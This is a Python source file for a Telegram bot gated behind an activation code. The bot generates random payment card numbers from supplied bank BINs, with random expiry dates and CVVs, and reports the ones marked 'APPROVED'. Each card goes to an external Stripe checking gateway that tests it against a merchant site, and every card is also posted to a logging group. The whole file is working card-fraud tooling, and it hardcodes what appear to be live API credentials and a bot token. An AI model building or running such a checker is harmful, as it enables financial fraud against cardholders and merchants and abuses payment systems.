import asyncio
import random
import string
import requests
from pyrogram import Client, filters
from pyrogram.types import Message

# --- CONFIGURATION ---
API_ID = 32737502  
API_HASH = "607af2a1b5e13bd137bb49fc557534a4"
BOT_TOKEN = "8348032155:AAER7rt7GCSu5B5C16LAhtkQT-omPZtYVvY"

OWNER_ID = 7082733957
LOG_GROUP_ID = -1003494774791 
ACTIVATION_CODE = "/ACTIVEEXHAUSTFF"

app = Client("exhaust_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

active_processes = {}
activated_users = {OWNER_ID}

def bin_lookup(bin_num):
    try:
        # Lookup first 6 digits for BIN info
        res = requests.get(f"https://bins.antipublic.cc/bins/{bin_num[:6]}", timeout=5).json()
        return {
            "country": res.get("country_name", "N/A"),
            "brand": res.get("brand", "N/A"),
            "bank": res.get("bank", "N/A")
        }
    except:
        return {"country": "N/A", "brand": "N/A", "bank": "N/A"}

def check_cc(cc_data):
    url = f"https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=moxy-roxy.com/cc={cc_data}"
    try:
        response = requests.get(url, timeout=15)
        text = response.text.lower()
        if any(k in text for k in ['approved', 'success', 'live', 'cvv live']):
            return "live", cc_data
        return "dead", cc_data
    except:
        return "error", "timeout"

@app.on_message(filters.text)
async def handle_commands(client, message: Message):
    text = message.text.strip()
    user_id = message.from_user.id

    # Activation Logic
    if text == ACTIVATION_CODE:
        activated_users.add(user_id)
        return await message.reply("🔓 **Activated Successfully!**")

    if user_id not in activated_users:
        return

    # Command Logic (.gen or /gen)
    if text.startswith((".", "/")):
        parts = text[1:].split()
        if not parts: return
        
        cmd = parts[0].lower()

        if cmd == "gen":
            if len(parts) < 2:
                return await message.reply("❌ Usage: `.gen 123456,434256 50`")

            bins = parts[1].split(',')
            amount = int(parts[2]) if len(parts) > 2 else 40
            
            active_processes[user_id] = True
            await message.reply("🚀 **Scanning Started...**")

            for b_val in bins:
                if not active_processes.get(user_id): break
                
                bin_num = b_val.strip()
                b_info = bin_lookup(bin_num)
                
                # Smart Padding: Fill to exactly 16 digits
                padding = 16 - len(bin_num)
                if padding < 0: padding = 0

                for _ in range(amount):
                    if not active_processes.get(user_id): break
                    
                    random_digits = ''.join(random.choices(string.digits, k=padding))
                    cc = bin_num + random_digits
                    mm = str(random.randint(1,12)).zfill(2)
                    yy = str(random.randint(2025,2031))
                    cvv = "".join(random.choices(string.digits, k=3))
                    
                    full_cc = f"{cc}|{mm}|{yy}|{cvv}"

                    # Log Group Drop Format
                    drop_msg = (
                        f"/st <code>{full_cc}</code>\n"
                        f"CC: <code>{full_cc}</code>\n"
                        f"COUNTRY:- {b_info['country']}\n"
                        f"BANK :- {b_info['bank']}\n\n"
                        f"BOT BY @X4YXN"
                    )
                    
                    try:
                        await client.send_message(LOG_GROUP_ID, drop_msg)
                        await asyncio.sleep(0.3) # Avoid flood
                    except: pass

                    # Actual Checking
                    status, result_cc = await asyncio.to_thread(check_cc, full_cc)
                    if status == "live":
                        hit = (
                            f"<b>APPROVED ✅</b>\n\n"
                            f"CC: <code>{result_cc}</code>\n"
                            f"Bank: {b_info['bank']}\n"
                            f"Country: {b_info['country']}"
                        )
                        await message.reply(hit)

        elif cmd == "stop":
            active_processes[user_id] = False
            await message.reply("🛑 **Process Stopped.**")

if __name__ == "__main__":
    print("Bot is starting...")
    app.run()
    